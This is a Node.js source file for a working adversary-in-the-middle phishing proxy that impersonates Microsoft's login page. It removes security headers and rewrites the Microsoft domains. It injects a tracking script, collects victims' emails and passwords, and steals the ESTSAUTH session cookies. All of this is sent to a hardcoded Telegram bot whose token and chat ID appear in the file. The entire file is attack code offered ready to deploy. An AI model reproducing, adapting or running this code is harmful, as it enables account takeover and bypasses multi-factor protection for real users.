const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 8080;

const upstream = "login.microsoftonline.com";
const telegram_bot_token = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const telegram_chat_id = "6743632244";

const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only", 
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
];

const emailMap = new Map();

async function dispatchMessage(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${telegram_bot_token}/sendMessage`, {
      chat_id: telegram_chat_id,
      text: message,
      parse_mode: "HTML"
    });
  } catch (err) {
    console.error("Telegram error:", err.message);
  }
}

// Middleware to parse JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Handle click notifications
app.post('/__notify_click', async (req, res) => {
  const { email, ip } = req.body;
  emailMap.set(ip || 'unknown', email || 'unknown');
  await dispatchMessage(`👀 <b>User is ready to enter password</b>\n🧑‍💻 <b>Email</b>: ${email}\n🌐 <b>IP</b>: ${ip}`);
  res.status(200).send('ok');
});

// Main proxy middleware
app.use('/', createProxyMiddleware({
  target: `https://${upstream}`,
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  
  onProxyReq: (proxyReq, req, res) => {
    const ip = req.headers['cf-connecting-ip'] || 
                req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
                req.headers['x-client-ip'] ||
                req.headers['true-client-ip'] || 
                req.headers['x-real-ip'] ||
                req.connection.remoteAddress ||
                'unknown';
    
    proxyReq.setHeader('Host', upstream);
    proxyReq.setHeader('User-Agent', 'AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)');
    proxyReq.setHeader('Accept-Encoding', 'gzip, deflate');
    proxyReq.setHeader('Referer', `${req.protocol}://${req.get('host')}`);
    
    console.log(`🔄 Proxying ${req.method}: ${req.protocol}://${req.get('host')}${req.originalUrl} → https://${upstream}${req.originalUrl}`);
    
    // Capture credentials from POST data
    if (req.method === 'POST' && req.body) {
      let loginfmt = '';
      let passwd = '';
      
      if (typeof req.body === 'string') {
        const params = new URLSearchParams(req.body);
        loginfmt = params.get('loginfmt') || '';
        passwd = params.get('passwd') || '';
      } else if (typeof req.body === 'object') {
        loginfmt = req.body.loginfmt || '';
        passwd = req.body.passwd || '';
      }
      
      if (loginfmt) {
        emailMap.set(ip, loginfmt);
      }
      
      if (loginfmt && passwd) {
        dispatchMessage(`📥 <b>Captured Credentials</b>:\n🧑‍💻 <b>Email</b>: ${loginfmt}\n🔑 <b>Password</b>: ${passwd}`);
      }
    }
  },
  
  onProxyRes: (proxyRes, req, res) => {
    const ip = req.headers['cf-connecting-ip'] || 
                req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
                req.headers['x-client-ip'] ||
                req.headers['true-client-ip'] || 
                req.headers['x-real-ip'] ||
                req.connection.remoteAddress ||
                'unknown';
    
    // Remove security headers
    delete_headers.forEach(header => {
      delete proxyRes.headers[header];
    });
    
    // Set CORS headers
    proxyRes.headers['access-control-allow-origin'] = '*';
    proxyRes.headers['access-control-allow-credentials'] = 'true';
    
    // Capture cookies
    const setCookieHeaders = proxyRes.headers['set-cookie'];
    if (setCookieHeaders) {
      const importantCookies = setCookieHeaders.filter(cookie =>
        /(ESTSAUTH|ESTSAUTHPERSISTENT|SignInStateCookie)=/.test(cookie)
      );
      
      if (importantCookies.length === 3) {
        const victimEmail = emailMap.get(ip) || 'unknown';
        const cookieText = importantCookies.map(c => c.split(';')[0]).join('\n');
        dispatchMessage(`🍪 <b>Captured Cookies</b> for <b>${victimEmail}</b>:\n<code>${cookieText}</code>`);
      }
      
      // Modify cookies to use our domain
      proxyRes.headers['set-cookie'] = setCookieHeaders.map(cookie =>
        cookie.replace(new RegExp(upstream, 'g'), req.get('host'))
      );
    }
    
    // Inject JavaScript for credential capture
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
      delete proxyRes.headers['content-length'];
      delete proxyRes.headers['content-encoding'];
      
      let body = '';
      proxyRes.on('data', chunk => {
        body += chunk;
      });
      
      proxyRes.on('end', () => {
        // Replace Microsoft domain with our domain
        body = body.replace(new RegExp(`https://${upstream}`, 'g'), `${req.protocol}://${req.get('host')}`);
        body = body.replace(new RegExp(upstream, 'g'), req.get('host'));
        
        // Inject credential capture script
        const script = `
        <script>
          document.addEventListener('DOMContentLoaded', () => {
            const interval = setInterval(() => {
              const btn = document.getElementById("idSIButton9");
              const emailInput = document.querySelector("input[name='loginfmt']");
              if (btn && emailInput) {
                clearInterval(interval);
                const realIP = "${ip}";
                btn.addEventListener("click", () => {
                  fetch("/__notify_click", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      event: "next_button_clicked",
                      email: emailInput.value,
                      ip: realIP
                    }),
                  });
                });
              }
            }, 500);
          });
        </script>`;
        
        body = body.replace('</body>', script + '</body>');
        
        res.end(body);
      });
    }
  },
  
  onError: (err, req, res) => {
    console.error('Proxy error:', err.message);
    res.status(500).send('Proxy error');
  }
}));

app.listen(port, '0.0.0.0', () => {
  console.log(`🚀 Microsoft Login Proxy running on port ${port}`);
  console.log(`🌐 Access via: http://localhost:${port}`);
  console.log(`🎯 This will show the REAL Microsoft login page`);
});